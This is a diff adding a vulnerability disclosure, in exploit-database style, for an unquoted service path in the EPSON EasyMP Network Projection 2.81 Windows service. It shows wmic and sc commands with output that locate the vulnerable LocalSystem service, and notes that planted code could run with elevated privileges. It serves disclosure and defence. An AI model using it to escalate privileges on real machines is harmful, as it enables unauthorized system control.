@@ -1,0 +1,34 @@
+# Exploit Title: EPSON EasyMP Network Projection 2.81 - 'EMP_NSWLSV' Unquoted Service Path
+# Discovery by: Roberto Piña
+# Discovery Date: 2020-02-13
+# Vendor Homepage: https://epson.com/support/easymp-network-projection-v2-86-for-windows
+# Software Link :https://ftp.epson.com/drivers/epson16189.exe
+# SEIKO EPSON CORP
+# Tested Version: 2.81
+# Vulnerability Type: Unquoted Service Path
+# Tested on OS: Windows 10 Home x64 en
+
+# Step to discover Unquoted Service Path: 
+
+
+C:\>wmic service get name, displayname, pathname, startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i "EPSON" | findstr /i /v """
+EMP_NSWLSV                                                EMP_NSWLSV                                C:\Program Files (x86)\EPSON Projector\EasyMP Network Projection V2\EMP_NSWLSV.exe                                                                                                                                                                                                   Auto
+
+C:\>sc qc "EMP_NSWLSV"
+[SC] QueryServiceConfig SUCCESS
+        SERVICE_NAME: EMP_NSWLSV                                                                                                                                                                    
+        TYPE               : 110  WIN32_OWN_PROCESS (interactive)
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files (x86)\EPSON Projector\EasyMP Network Projection V2\EMP_NSWLSV.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : EMP_NSWLSV
+        DEPENDENCIES       : RPCSS
+        SERVICE_START_NAME : LocalSystem
+
+#Exploit:
+# A successful attempt would require the local user to be able to insert their code in the system root path 
+# undetected by the OS or other security applications where it could potentially be executed during 
+# application startup or reboot. If successful, the local user's code would execute with the elevated 
+# privileges of the application.
